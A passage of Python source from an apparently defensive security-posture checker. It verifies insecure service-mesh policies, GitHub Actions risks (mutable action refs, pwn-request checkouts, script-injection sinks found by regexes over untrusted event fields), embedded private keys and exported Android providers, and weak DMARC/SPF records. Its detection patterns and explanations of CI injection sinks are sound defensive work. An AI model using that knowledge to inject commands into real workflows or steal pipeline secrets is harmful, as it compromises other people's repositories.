# (mirrors how k8s requires a hard FAIL and cloud respects an explicit compliant status).
_MESH_COMPLIANT_STATUSES = frozenset({
    "pass", "passed", "ok", "compliant", "info", "informational", "not_applicable",
    "na", "n/a", "skipped", "manual",
})


def _mesh_authz_allows_all(action: Any, rules: Any) -> tuple[bool, str]:
    """True iff an Istio AuthorizationPolicy provably admits EVERY caller. Fires only when ``action`` is
    ``ALLOW`` (or unset — Istio's default action is ALLOW) AND a rule matches everyone: an EMPTY catch-all
    rule (no ``from`` / ``to`` / ``when`` — matches every request) or a ``*`` wildcard PEER principal named
    in a ``from.source.principals`` clause. NOTE: ``requestPrincipals: ["*"]`` is deliberately NOT treated
    as allow-all — a ``*`` request principal REQUIRES a valid JWT (any authenticated caller), which is the
    RECOMMENDED Istio "require a valid token" posture, not an anonymous grant (the review's false positive).
    An ALLOW policy with NO rules is DENY-all
    (secure -> no fire); a ``DENY`` / ``CUSTOM`` / ``AUDIT`` action is never an allow-all grant. A rule that
    restricts by ``to`` (path/method) but omits ``from`` is deliberately NOT treated as allow-all — an
    operator publishing a public endpoint is a design choice, not a near-zero-FP-provable misconfig."""
    act = _coerce_text(action).strip().upper() or "ALLOW"   # Istio default action is ALLOW
    if act != "ALLOW":
        return (False, "")
    if not isinstance(rules, (list, tuple)):
        return (False, "")
    for rule in list(rules)[:_MESH_MAX_RULES]:
        if not isinstance(rule, Mapping):
            continue
        froms, tos, whens = rule.get("from"), rule.get("to"), rule.get("when")
        # an entirely empty rule matches EVERY request (any source, any operation) -> allow-all.
        if not froms and not tos and not whens:
            return (True, "empty_catch_all_rule")
        # a `*` wildcard principal literally named in a from.source clause -> all principals.
        if isinstance(froms, (list, tuple)):
            for f in froms:
                if not isinstance(f, Mapping):
                    continue
                src = f.get("source")
                if not isinstance(src, Mapping):
                    continue
                # ONLY the mTLS PEER-identity `principals` — a `*` there is anonymous-peer allow-all.
                # `requestPrincipals` (JWT identity) is excluded: `*` there requires a valid token.
                vals = src.get("principals")
                if isinstance(vals, (list, tuple)) and any(
                        _coerce_text(v).strip() in _MESH_ANON_PRINCIPALS for v in vals):
                    return (True, "wildcard_principal")
    return (False, "")


def mesh_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a retained service-mesh posture control PROVABLY carries an insecure ACHIEVED STATE — the
    membership/parse-proof that promotes a mesh-config LEAD to a FACT over the control's achieved state
    ALONE (offline, ZERO mesh/kubectl calls, NO attack). The MESH twin of ``cloud_posture_oracle``: a mesh
    linter's "permissive / allows everyone" is a third-party heuristic; this oracle re-derives the insecure
    state over the RETAINED control so the scanner's verdict is never rubber-stamped and a hardened mesh is
    never confirmed.

    ``observed_control`` is the JSON-safe retained control (``verify.mesh_posture.ingest_mesh_config``
    mints it from an Istio / Linkerd manifest)::

        {"resource_kind": "PeerAuthentication", "name": "default", "namespace": "istio-system",
         "scope": "mesh", "mtls_mode": "PERMISSIVE"}
        {"resource_kind": "AuthorizationPolicy", "name": "ns-allow", "namespace": "prod",
         "scope": "namespace", "action": "ALLOW", "rules": [{}]}
        {"resource_kind": "Server", "name": "web", "namespace": "prod",
         "default_inbound_policy": "all-unauthenticated"}   # Linkerd

    Fires (0.9) only when an EXPLICIT insecure achieved-state holds (fixed rule order):
      1. ``permissive_mtls`` — an Istio PeerAuthentication whose effective ``mtls_mode`` is ``PERMISSIVE``
         or ``DISABLE`` (plaintext transport is accepted — a STRICT-mTLS mesh cannot exhibit this);
      2. ``authz_allow_all`` — an Istio AuthorizationPolicy (``action: ALLOW`` or unset) that provably
         admits EVERY caller: an empty catch-all rule, or a ``*`` wildcard principal named in a from-clause;
      3. ``linkerd_unauthenticated`` — a Linkerd server whose ``default_inbound_policy`` is
         ``all-unauthenticated`` (any client, even unmeshed / unauthenticated, may connect).

    Does NOT fire (stays an honest LEAD) when: the control records an EXPLICIT compliant/pass status; the
    achieved state is hardened (STRICT mTLS, a scoped or DENY policy, an ALLOW policy with no rules =
    deny-all, an authenticated Linkerd policy); or the relevant field is ABSENT/unknown (an absent mTLS
    mode inherits a parent and is never promoted). Malformed / non-mapping evidence -> non-fire (never
    raises). Pure + deterministic, so the same verdict re-verifies offline from the retained context.
    GROUNDING is procedural exactly as for every oracle: the control MUST be the RETAINED mesh evidence,
    never a re-run of a live mesh call laundered as a fact."""
    if not isinstance(observed_control, Mapping):
        return OracleSignal(kind=OracleKind.MESH_POSTURE, fired=False, confidence=0.0,
                            evidence="no service-mesh control evidence")
    ctl = observed_control
    kind = _coerce_text(ctl.get("resource_kind") or ctl.get("kind"))[:_MESH_STR_CAP].strip()
    name = _coerce_text(ctl.get("name"))[:_MESH_STR_CAP].strip()
    ns = _coerce_text(ctl.get("namespace"))[:_MESH_STR_CAP].strip()
    scope = _coerce_text(ctl.get("scope"))[:_MESH_STR_CAP].strip().lower()
    status = _coerce_text(ctl.get("status")).strip().lower()
    label = name or kind or "?"

    # Respect an EXPLICIT compliant verdict — a control a linter passed is never promoted.
    if status in _MESH_COMPLIANT_STATUSES:
        return OracleSignal(
            kind=OracleKind.MESH_POSTURE, fired=False, confidence=0.0,
            evidence=(f"mesh control {label} records a compliant status {status!r} — not an insecure "
                      f"achieved state (stays a lead)"),
            observed={"name": name, "namespace": ns, "status": status})

    # Rule 1 — Istio PeerAuthentication effective mTLS mode is PERMISSIVE / DISABLE (plaintext accepted).
    mtls_mode = _coerce_text(ctl.get("mtls_mode")).strip().lower()
    if mtls_mode in _MESH_PERMISSIVE_MTLS:
        return OracleSignal(
            kind=OracleKind.MESH_POSTURE, fired=True, confidence=0.9,
            evidence=(f"service-mesh posture fact: PeerAuthentication {label} (scope {scope or '?'}) sets "
                      f"mTLS mode {mtls_mode.upper()} — plaintext transport is ACCEPTED (a STRICT-mTLS "
                      f"mesh cannot), promoted over the retained mesh config"),
            observed={"name": name, "namespace": ns, "scope": scope, "rule": "permissive_mtls",
                      "mtls_mode": mtls_mode.upper(), "reason": "insecure_achieved_state"})

    # Rule 2 — Istio AuthorizationPolicy (action ALLOW / unset) that provably admits every caller.
    allows_all, why = _mesh_authz_allows_all(ctl.get("action"), ctl.get("rules"))
    if allows_all:
        return OracleSignal(
            kind=OracleKind.MESH_POSTURE, fired=True, confidence=0.9,
            evidence=(f"service-mesh posture fact: AuthorizationPolicy {label} (scope {scope or '?'}) with "
                      f"action ALLOW admits EVERY caller ({why}) — no principal is required, promoted over "
                      f"the retained mesh config"),
            observed={"name": name, "namespace": ns, "scope": scope, "rule": "authz_allow_all",
                      "detail": why, "reason": "insecure_achieved_state"})

    # Rule 3 — Linkerd server default-inbound-policy is all-unauthenticated (any client may connect).
    inbound = _coerce_text(ctl.get("default_inbound_policy") or ctl.get("inbound_policy")).strip().lower()
    if inbound in _MESH_UNAUTH_INBOUND:
        return OracleSignal(
            kind=OracleKind.MESH_POSTURE, fired=True, confidence=0.9,
            evidence=(f"service-mesh posture fact: Linkerd server {label} default-inbound-policy is "
                      f"'all-unauthenticated' — any client (even unmeshed / unauthenticated) may connect, "
                      f"promoted over the retained mesh config"),
            observed={"name": name, "namespace": ns, "rule": "linkerd_unauthenticated",
                      "inbound_policy": inbound, "reason": "insecure_achieved_state"})

    return OracleSignal(
        kind=OracleKind.MESH_POSTURE, fired=False, confidence=0.0,
        evidence=(f"mesh control {label} carries no EXPLICIT permissive-mTLS / allow-all-authz / "
                  f"unauthenticated-inbound achieved state (STRICT mTLS / scoped or deny policy / "
                  f"authenticated inbound, or fields absent) — not provably an insecure state (stays a lead)"),
        observed={"name": name, "namespace": ns, "kind": kind, "scope": scope, "status": status,
                  "mtls_mode": mtls_mode, "inbound_policy": inbound})


# ---------------------------------------------------------------------------
# CI/CD posture — a parsed GitHub-Actions control provably carries a dangerous construct
# ---------------------------------------------------------------------------
#
# Phase-2: promote a parsed workflow control (verify.cicd_posture.ingest_workflow / sensors.cicd) to a
# FACT by RE-DERIVING the danger over the RETAINED control — never trusting the ingest's rule label. Each
# rule fires only on a concrete, literal construct a benign workflow does not carry (near-zero-FP):
#   * unpinned_action  — a THIRD-PARTY action (owner/repo@ref, owner not actions/github, not ./local or
#     docker://) pinned to a MUTABLE ref (ref is not a 40-hex commit SHA). SHA-pinned / first-party /
#     local do NOT fire.
#   * pwn_request      — `on: pull_request_target` AND a checkout of the UNTRUSTED PR head (head.sha /
#     head.ref / github.head_ref / refs/pull/*). A plain `pull_request` trigger, or a base checkout, do
#     NOT fire.
#   * script_injection — a `run:` shell body that INTERPOLATES an untrusted `${{ github.event.*.title|
#     body|... }}` / `${{ github.head_ref }}` expression (a shell-injection sink). A run with no untrusted
#     `${{ }}` does NOT fire.
# Pure + deterministic (re-verifies offline); ReDoS-safe (length-capped, fixed-alternation).
_CICD_VALUE_CAP = 8192
_SHA40_RE = re.compile(r"^[0-9a-fA-F]{40}$")
_CICD_FIRST_PARTY = frozenset({"actions", "github"})
_ACTION_REF_RE = re.compile(r"^([^/@\s]+)/([^@\s]+)@(\S+)$")
# Attacker-controllable Actions context REFERENCES as boundary-anchored regexes (NOT substrings — review
# wp7kachv5): a reference matches only as a WHOLE property path at an INJECTABLE TEXT leaf, so a longer/
# other path (`github.event.commits[0].id` — a SHA; `.timestamp`; `.url`), a different prefix
# (`mygithub…`, `github.event.commits_url`), and a quoted STRING LITERAL (which never dereferences a
# context) do NOT fire. `(?<![\w.])` / `(?![\w.])` are the identifier boundaries.
_QUOTED_LIT_RE = re.compile(r"'[^']*'|\"[^\"]*\"")
_UNTRUSTED_CTX_RES: tuple["re.Pattern[str]", ...] = tuple(re.compile(p, re.I) for p in (
    r"(?<![\w.])github\.head_ref(?![\w.])",
    r"(?<![\w.])github\.event\.issue\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.pull_request\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.pull_request\.head\.(?:ref|label)(?![\w.])",
    r"(?<![\w.])github\.event\.comment\.body(?![\w.])",
    r"(?<![\w.])github\.event\.(?:review|review_comment)\.body(?![\w.])",
    r"(?<![\w.])github\.event\.discussion\.(?:title|body)(?![\w.])",
    r"(?<![\w.])github\.event\.head_commit\.(?:message|author\.(?:name|email))(?![\w.])",
    # array contexts: an INDEX/wildcard then an injectable TEXT leaf ONLY (never .id/.sha/.timestamp/.url).
    r"(?<![\w.])github\.event\.commits(?:\[[^\]]*\]|\.\*)?\.(?:message|author\.(?:name|email))(?![\w.])",
    r"(?<![\w.])github\.event\.pages(?:\[[^\]]*\]|\.\*)?\.page_name(?![\w.])",
))
_UNTRUSTED_PR_CHECKOUT_RE = re.compile(
    r"(?i)(github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|refs/pull/)")
_INTERP_RE = re.compile(r"\$\{\{(.+?)\}\}", re.S)


def _cicd_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.CICD_POSTURE, fired=fired, confidence=(conf if fired else 0.0),
                        evidence=evidence, observed=observed)


def cicd_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a parsed GitHub-Actions control PROVABLY carries a dangerous construct — a re-verifiable
    parse-proof over the RETAINED control that promotes ``verify.cicd_posture`` / ``sensors.cicd``'s
    workflow LEAD to a FACT. Never trusts the ingest's rule label: it re-derives the danger from the
    literal evidence, so a benign workflow (SHA-pinned action, plain ``pull_request``, no untrusted
    interpolation) never fires. Pure + deterministic; re-verifies offline. Never raises."""
    if not isinstance(observed_control, Mapping):
        return _cicd_signal(False, evidence="no CI/CD control evidence", observed={})
    ctl = observed_control
    rule = _coerce_text(ctl.get("rule")).strip().lower()
    wf = _coerce_text(ctl.get("workflow")).strip()
    job = _coerce_text(ctl.get("job")).strip()
    loc = (wf or "?") + (f" job {job}" if job else "")

    if rule == "unpinned_action":
        uses = _coerce_text(ctl.get("uses"))[:_CICD_VALUE_CAP].strip()
        m = _ACTION_REF_RE.match(uses)
        if m is None:
            return _cicd_signal(False, evidence=f"{uses!r} is not an owner/repo@ref action reference",
                                observed={"rule": rule, "uses": uses})
        owner, repo, ref = m.group(1), m.group(2), m.group(3)
        if owner.lower() in _CICD_FIRST_PARTY or uses.startswith("./") or uses.startswith("docker://"):
            return _cicd_signal(False, evidence=f"{uses!r} is a first-party/local action (not a supply-chain risk)",
                                observed={"rule": rule, "uses": uses, "owner": owner})
        if _SHA40_RE.match(ref):
            return _cicd_signal(False, evidence=f"{uses!r} is SHA-pinned (immutable)",
                                observed={"rule": rule, "uses": uses, "ref": ref})
        return _cicd_signal(True, conf=0.85,
                            evidence=(f"{loc}: third-party action {owner}/{repo} is pinned to the MUTABLE ref "
                                      f"{ref!r} (not a commit SHA) — a supply-chain risk (the action can change under you)"),
                            observed={"rule": rule, "uses": uses, "owner": owner, "repo": repo, "ref": ref})

    if rule == "pwn_request":
        trigger = _coerce_text(ctl.get("trigger")).strip().lower()
        checkout = _coerce_text(ctl.get("checkout_ref"))[:_CICD_VALUE_CAP]
        if trigger != "pull_request_target":
            return _cicd_signal(False, evidence=f"trigger {trigger!r} is not pull_request_target",
                                observed={"rule": rule, "trigger": trigger})
        if not _UNTRUSTED_PR_CHECKOUT_RE.search(checkout):
            return _cicd_signal(False, evidence="pull_request_target does not check out the untrusted PR head",
                                observed={"rule": rule, "trigger": trigger, "checkout_ref": checkout.strip()})
        return _cicd_signal(True, conf=0.9,
                            evidence=(f"{loc}: pull_request_target checks out the UNTRUSTED PR head "
                                      f"({checkout.strip()!r}) — a pwn-request (attacker PR code runs with the "
                                      f"workflow's write-scoped token/secrets)"),
                            observed={"rule": rule, "trigger": trigger, "checkout_ref": checkout.strip()})

    if rule == "script_injection":
        run = _coerce_text(ctl.get("run"))[:_CICD_VALUE_CAP]
        for m in _INTERP_RE.finditer(run):
            expr = m.group(1)
            body = _QUOTED_LIT_RE.sub(" ", expr)   # a quoted literal never dereferences a context
            for rx in _UNTRUSTED_CTX_RES:
                hit = rx.search(body)
                if hit is not None:
                    return _cicd_signal(True, conf=0.9,
                        evidence=(f"{loc}: a `run:` step interpolates the UNTRUSTED expression "
                                  + "${{ " + expr.strip() + " }} into the shell — a script-injection sink"),
                        observed={"rule": rule, "expression": expr.strip(), "match": hit.group(0)})
        return _cicd_signal(False, evidence="no untrusted ${{ github.event.* }} interpolation in the run body",
                            observed={"rule": rule})

    return _cicd_signal(False, evidence=f"unrecognised CI/CD rule {rule!r} (stays a lead)",
                        observed={"rule": rule})


def _mobile_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.MOBILE_POSTURE, fired=fired, confidence=(conf if fired else 0.0),
                        evidence=evidence, observed=observed)


def mobile_posture_oracle(observed_control: Any) -> OracleSignal:
    """Promote a retained MobSF mobile-posture control to a FACT ONLY when the weakness is offline-
    RE-DERIVABLE from the control's literal evidence — never trusting the scanner's label. This slice
    proves ONE rule: ``private_key_material`` — an embedded PEM private-key block is a FACT iff the
    retained ``pem`` string LOADS as an UNENCRYPTED, structurally-valid private key (re-executed via
    ``cryptography``). An encrypted key (needs a passphrase we cannot prove), a public key, a certificate,
    a masked/partial blob, or an unparseable string do NOT fire — the oracle REFUSES rather than assert a
    weakness it cannot reconstruct. Pure, offline, deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return _mobile_signal(False, evidence="no mobile control evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower()

    if rule == "private_key_material":
        pem = _coerce_text(observed_control.get("pem"))
        if "PRIVATE KEY-----" not in pem:
            return _mobile_signal(False, evidence="no PEM private-key block in the retained evidence",
                                  observed={"rule": rule})
        try:
            from cryptography.hazmat.primitives.serialization import (  # noqa: PLC0415
                load_pem_private_key,
            )
        except Exception:
            # the crypto lib is absent → we cannot RE-DERIVE, so we REFUSE (never assert on trust).
            return _mobile_signal(False, evidence="cannot re-derive: cryptography unavailable",
                                  observed={"rule": rule})
        try:  # the OpenSSH container (ssh-keygen's default since 7.8) needs a distinct loader
            from cryptography.hazmat.primitives.serialization import (  # noqa: PLC0415
                load_ssh_private_key,
            )
        except Exception:  # very old cryptography — the PKCS1/8/SEC1 path below still works
            load_ssh_private_key = None
        data = pem.encode("utf-8", "replace")
        loaders = [load_pem_private_key] + ([load_ssh_private_key] if load_ssh_private_key else [])
        key = None
        for loader in loaders:
            try:
                key = loader(data, password=None)
                break
            except TypeError:
                # an ENCRYPTED private key (needs a passphrase we do not have) — real key material, but
                # its usability is unproven, so it stays a LEAD, not a fact.
                return _mobile_signal(False, evidence="an encrypted private key (passphrase-protected) — a lead, not a proven-usable key",
                                      observed={"rule": rule, "encrypted": True})
            except Exception:
                # this container did not parse it — try the next loader (PEM vs OpenSSH), else REFUSE.
                continue
        if key is None:
            # not a loadable key in any container (a public key, a cert, a masked/partial blob, garbage).
            return _mobile_signal(False, evidence="the PEM block does not load as a private key",
                                  observed={"rule": rule})
        key_kind = type(key).__name__
        return _mobile_signal(True, conf=0.95,
                              evidence=("an UNENCRYPTED, structurally-valid private key "
                                        f"({key_kind}) is embedded in the distributed client — extractable "
                                        "by anyone with the APK; not a secret"),
                              observed={"rule": rule, "key_type": key_kind})

    if rule == "exported_content_provider":
        # SOUND only on an EXPLICIT android:exported="true" with ZERO permission guards. We deliberately
        # REFUSE the default-export gating chain (a provider's export default depends on min/targetSdk —
        # a semantic layer the manifest fragment may not resolve): an absent/other `exported` is a LEAD,
        # never asserted. A provider carrying ANY of android:permission / readPermission / writePermission
        # / a <path-permission> child is guarded → NO fire (conservative: a set permission of any level
        # means the claim "unguarded" would be false).
        exported = _coerce_text(observed_control.get("exported")).strip().lower()
        if exported != "true":
            return _mobile_signal(False, observed={"rule": rule, "exported": exported},
                                  evidence="content provider is not EXPLICITLY exported=true (default-export unresolved — a lead)")
        guarded = any(_coerce_text(observed_control.get(k)).strip()
                      for k in ("permission", "read_permission", "write_permission"))
        if guarded or bool(observed_control.get("has_path_permission")):
            return _mobile_signal(False, observed={"rule": rule},
                                  evidence="the exported content provider carries a permission guard (not unguarded)")
        name = _coerce_text(observed_control.get("name")).strip()
        return _mobile_signal(True, conf=0.9,
                              evidence=(f"content provider{(' ' + name) if name else ''} is EXPORTED with no "
                                        "permission/readPermission/writePermission/path-permission guard — any "
                                        "installed app can read/write its content:// data"),
                              observed={"rule": rule, "name": name})

    return _mobile_signal(False, evidence=f"unrecognised/lead-only mobile rule {rule!r} (stays a lead)",
                          observed={"rule": rule})


# ---------------------------------------------------------------------------
# Email-authentication posture (FORGE Domain 10) — a published policy that permits spoofing
# ---------------------------------------------------------------------------

# A DMARC policy that instructs receivers NOT to reject/quarantine spoofed mail. `p=none` is monitor-only:
# the domain publishes DMARC but explicitly asks receivers to take NO action, so spoofed mail is delivered.
# The `(?:^|;)\s*` boundary is load-bearing: it must never match the `sp=` (subdomain) or `np=` tags.
_DMARC_P_RE = re.compile(r"(?i)(?:^|;)\s*p\s*=\s*(none|quarantine|reject)\s*(?:;|$)")
# RFC 7489 §6.3: `sp=` overrides `p=` FOR SUBDOMAINS when present.
_DMARC_SP_RE = re.compile(r"(?i)(?:^|;)\s*sp\s*=\s*(none|quarantine|reject)\s*(?:;|$)")
# A PRESENCE probe for the `sp=` tag, independent of whether its VALUE parses. Load-bearing: "the value
# regex did not match" must never be read as "there is no sp= tag" — a failed parse is not proof of absence
# (the same error class as assuming a missing record means no policy). If sp= is present but unparseable we
# REFUSE rather than fall through to `p=` and read the WRONG tag.
_DMARC_SP_PRESENT_RE = re.compile(r"(?i)(?:^|;)\s*sp\s*=")
# One DNS TXT character-string in PRESENTATION form.
_TXT_STRING_RE = re.compile(r'"((?:[^"\\]|\\.)*)"')
# A zone-file RR header (`_dmarc.gov.example. 3600 IN TXT`) — the ONLY unquoted content permitted to
# precede a record's character-strings.
_ZONE_RR_HEADER_RE = re.compile(r"(?i)^[^\s\"]+(?:\s+(?:\d+|IN|CH|CS|HS))*\s+TXT$")
# RFC 7489 §6.6.3 / RFC 7208 §4.5 record SELECTION: a record that does not begin with the version tag is
# not a policy record at all and is discarded by receivers.
_DMARC_VERSION_RE = re.compile(r"(?i)^v\s*=\s*DMARC1\s*(?:;|$)")
_SPF_VERSION_RE = re.compile(r"(?i)^v=spf1(?:\s|$)")


def _resolve_txt_record(line: str) -> str | None:
    """ONE record's presentation form -> the character-string it encodes; ``None`` if it does not
    unambiguously encode one.

    RFC 1035 §3.3.14 concatenates ADJACENT character-strings *within a single record*. Anything else
    outside the strings is content this cannot faithfully resolve — and silently DISCARDING it is how a
    protective tag disappears (`'"v=DMARC1; p=none;" sp=reject'` -> a `sp=reject` that never reaches the
    parser). Unquoted content mixed among character-strings is REFUSED, never dropped."""
    if '"' not in line:
        return line.strip()                     # bare / already-canonical
    spans = list(_TXT_STRING_RE.finditer(line))
    if not spans:
        return None                             # a quote opens a string that never closes
    head = line[: spans[0].start()].strip()
    if head and not _ZONE_RR_HEADER_RE.match(head):
        return None                             # unquoted content ahead of the record
    prev = spans[0].end()
    for span in spans[1:]:
        if line[prev : span.start()].strip():
            return None                         # unquoted content BETWEEN character-strings
        prev = span.end()
    if line[prev:].strip():
        return None                             # unquoted content trailing the record
    return "".join(span.group(1) for span in spans).strip()


def _txt_records(raw: Any) -> list[str] | None:
    """A retained DNS TXT blob -> the list of RECORDS it encodes; ``None`` if it cannot be resolved.

    Load-bearing: concatenation is defined WITHIN one record — separate records are NEVER joined, and
    ``dig +short`` prints one record per line. Joining across record boundaries both FABRICATES policy
    (two DMARC records -> one spliced record asserting a `p=` no record published, its verdict decided by
    RRset return order) and DESTROYS it. Records are split here on newlines outside quotes and outside
    zone-file `( )` continuation; an unbalanced quote or paren is unresolvable input, not a record."""
    s = _coerce_text(raw)
    if not s.strip():
        return []
    lines: list[str] = []
    buf: list[str] = []
    in_quote = False
    depth = 0
    i = 0
    while i < len(s):
        c = s[i]
        if in_quote:
            if c == "\\" and i + 1 < len(s):     # an escaped char never closes the string
                buf.append(c)
                buf.append(s[i + 1])
                i += 2
                continue
            if c == '"':
                in_quote = False
            buf.append(c)
        elif c == '"':
            in_quote = True
            buf.append(c)
        elif c == "(" or c == ")":               # zone-file grouping: a newline inside is NOT a boundary
            depth += 1 if c == "(" else -1
            if depth < 0:
                return None
            buf.append(" ")
        elif c == "\n" and depth == 0:
            lines.append("".join(buf))
            buf = []
        else:
            buf.append(" " if c == "\n" else c)
        i += 1
    if in_quote or depth != 0:
        return None
    lines.append("".join(buf))
    out: list[str] = []
    for line in lines:
        if not line.strip():
            continue
        record = _resolve_txt_record(line)
        if record is None:
            return None
        if record:
            out.append(record)
    return out


def _select_txt(raw: Any, version: "re.Pattern[str]") -> str | None:
    """The ONE policy record a receiver would act on; ``""`` only when the producer retained NOTHING;
    ``None`` when the blob is unresolvable, carries no policy record, or carries more than one.

    A real apex TXT set is normally MULTI-record (SPF alongside site-verification tokens), so selecting the
    version-tagged record — RFC 7489 §6.6.3 / RFC 7208 §4.5 — is what makes a real export readable at all.
    Duplicate policy records are refused rather than resolved: both RFCs make a duplicate set apply NO
    policy, and picking one of them would be asserting from an ambiguity.

    Load-bearing, and the reason absence is read from the EMPTY blob and not from a failed selection: "no
    record here matched the version tag" is NOT proof that the domain publishes no policy — it is equally
    what a record this cannot canonicalise looks like (a presentation form outside RFC 1035's grammar, say),
    and reading that as absence would fire `dmarc_missing` at a domain whose record is right there in the
    evidence. Absence is only ever asserted from a producer that retained NOTHING and attested it OBSERVED
    the lookup; a non-empty blob that yields no policy record is unresolved input, so REFUSE."""
    records = _txt_records(raw)
    if records is None:
        return None
    if not records:
        return ""                               # the producer retained nothing — absence, gated on *_observed
    hits = [r for r in records if version.match(r)]
    if len(hits) != 1:
        return None
    return hits[0]
# SPF's `all` mechanism qualifier: `-all` fail (good), `~all` softfail, `?all` neutral, `+all`/`all` PASS-ALL
# (any host on the internet passes SPF for this domain — an unconditionally broken policy).
_SPF_ALL_RE = re.compile(r"(?i)(?:^|\s)([-~?+]?)all(?:\s|$)")


def _email_signal(fired: bool, *, evidence: str, observed: dict, conf: float = 0.9) -> OracleSignal:
    return OracleSignal(kind=OracleKind.EMAIL_AUTH_POSTURE, fired=fired,
                        confidence=(conf if fired else 0.0), evidence=evidence, observed=observed)


def email_auth_posture_oracle(observed_control: Any) -> OracleSignal:
    """Fire when a domain's RETAINED, PUBLISHED email-authentication policy provably permits spoofing — a
    pure re-derivation over the DNS TXT records themselves, never a receiving MTA's ``Authentication-Results``
    say-so (that would be string trust). Three rules, each unconditional and re-verifiable offline:

      * ``dmarc_missing``  — the domain publishes NO DMARC record: receivers are given no policy, so
        header-From spoofing is unmitigated (SPF alone does not protect the header-From a user sees).
      * ``dmarc_none``     — DMARC ``p=none``: the domain explicitly instructs receivers to take NO action.
      * ``spf_permissive`` — SPF ends in ``+all``/``all``: ANY host on the internet passes SPF for the domain.

    A hardened domain (``p=reject``/``p=quarantine``, SPF ``-all``) does NOT fire. DELIBERATELY out of scope
    (REFUSE, never assert): message-level SPF/DKIM/DMARC verification — DKIM canonicalisation and SPF
    include/macro chains are a semantic layer this cannot soundly re-derive offline; and ``spf_missing`` alone
    (DKIM+DMARC may still protect the domain — a gating chain). Pure + deterministic; never raises."""
    if not isinstance(observed_control, Mapping):
        return _email_signal(False, evidence="no email-auth control evidence", observed={})
    rule = _coerce_text(observed_control.get("rule")).strip().lower()
    domain = _coerce_text(observed_control.get("domain")).strip()
    where = f" for {domain}" if domain else ""

    if rule == "dmarc_missing":
        rec = _select_txt(observed_control.get("dmarc_record"), _DMARC_VERSION_RE)
        org_rec = _select_txt(observed_control.get("org_dmarc_record"), _DMARC_VERSION_RE)
        if rec is None or org_rec is None:
            # The blob does not resolve to one policy record (duplicate records, or unquoted content mixed
            # among character-strings). Reading a spliced or truncated record would assert a policy NO
            # record published: absence is UNRESOLVED here, so refuse.
            return _email_signal(False, observed={"rule": rule},
                                 evidence=("a retained DMARC record set does not resolve to a single policy "
                                           "record — the published policy is UNRESOLVED (REFUSE)"))
        # only assert absence when the producer OBSERVED the lookup and recorded no record (never assume)
        if rec:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="a DMARC record is present — not missing")
        if observed_control.get("dmarc_observed") is not True:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="DMARC lookup not observed — absence unproven (REFUSE)")
        # self-contradictory evidence (attested an org domain AND handed an org-domain policy to inherit)
        # is refused rather than resolved down whichever branch happens to fire.
        if observed_control.get("is_org_domain") is True and (
                org_rec or observed_control.get("org_dmarc_observed") is True):
            return _email_signal(False, observed={"rule": rule},
                                 evidence=("contradictory evidence: attested an ORGANIZATIONAL domain yet "
                                           "carries an organizational-domain policy to inherit (REFUSE)"))
        # RFC 7489 §6.6.3: an ABSENT record at the From-domain does NOT mean "no policy" — receivers then
        # query the ORGANIZATIONAL domain, and §6.3 applies its `sp=` (else `p=`) to the subdomain. So a
        # subdomain that correctly publishes nothing is FULLY protected by an org `p=reject`. Absence alone
        # therefore proves NOTHING; the EFFECTIVE policy must be resolved from the RETAINED evidence, or we
        # REFUSE (the same discipline that already refuses `spf_missing` as a gating chain).
        if observed_control.get("is_org_domain") is True:
            return _email_signal(True, conf=0.9,
                                 evidence=(f"no DMARC record is published for the ORGANIZATIONAL domain"
                                           f"{where or ' (unnamed)'} — there is no parent policy to inherit, "
                                           "so receivers are given no policy for it or its subdomains"),
                                 observed={"rule": rule, "domain": domain, "scope": "organizational"})
        if observed_control.get("org_dmarc_observed") is not True:
            return _email_signal(False, observed={"rule": rule, "domain": domain},
                                 evidence=("no DMARC here, but this is not attested an organizational domain "
                                           "and the organizational-domain lookup was not observed — the RFC 7489 "
                                           "§6.6.3 inheritance chain is UNRESOLVED (REFUSE)"))
        org = _coerce_text(observed_control.get("org_domain")).strip()
        if not org:
            # a fired certificate must NAME the domain whose policy was looked up, or a third party
            # re-running it cannot audit the inheritance claim.
            return _email_signal(False, observed={"rule": rule, "domain": domain},
                                 evidence=("the organizational domain is not named — the inheritance claim "
                                           "would not be auditable from the certificate (REFUSE)"))
        if not org_rec:
            return _email_signal(True, conf=0.9,
                                 evidence=(f"neither{where} nor its organizational domain {org} publishes "
                                           "DMARC — no policy exists anywhere in the chain to inherit"),
                                 observed={"rule": rule, "domain": domain, "org_domain": org})
        # §6.3: the subdomain inherits `sp=` when present, else the org domain's `p=`.
        m = _DMARC_SP_RE.search(org_rec)
        if m is None and _DMARC_SP_PRESENT_RE.search(org_rec):
            # An `sp=` tag IS present but its value did not parse. Falling through to `p=` would read the
            # WRONG tag and assert the negative from a failed parse — the same error class as assuming
            # absence. The SUBDOMAIN policy is unresolved: REFUSE.
            return _email_signal(False, observed={"rule": rule, "org_domain": org},
                                 evidence=("the organizational record carries an sp= tag whose value did not "
                                           "parse — the subdomain policy is UNRESOLVED (REFUSE)"))
        if m is None:
            m = _DMARC_P_RE.search(org_rec)
        if m is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="the organizational DMARC record has no parseable policy (REFUSE)")
        eff = m.group(1).lower()
        if eff != "none":
            return _email_signal(False, observed={"rule": rule, "inherited_policy": eff},
                                 evidence=(f"publishes no DMARC of its own but INHERITS the organizational "
                                           f"domain's effective subdomain policy p={eff} — protected"))
        return _email_signal(True, conf=0.9,
                             evidence=(f"no DMARC is published{where} and the organizational domain"
                                       f"{(' ' + org) if org else ''} resolves to an effective subdomain "
                                       "policy of none — receivers are told to take no action"),
                             observed={"rule": rule, "domain": domain, "org_domain": org,
                                       "inherited_policy": eff})

    if rule == "dmarc_none":
        rec = _select_txt(observed_control.get("dmarc_record"), _DMARC_VERSION_RE)
        if rec is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence=("the retained DMARC record set does not resolve to a single "
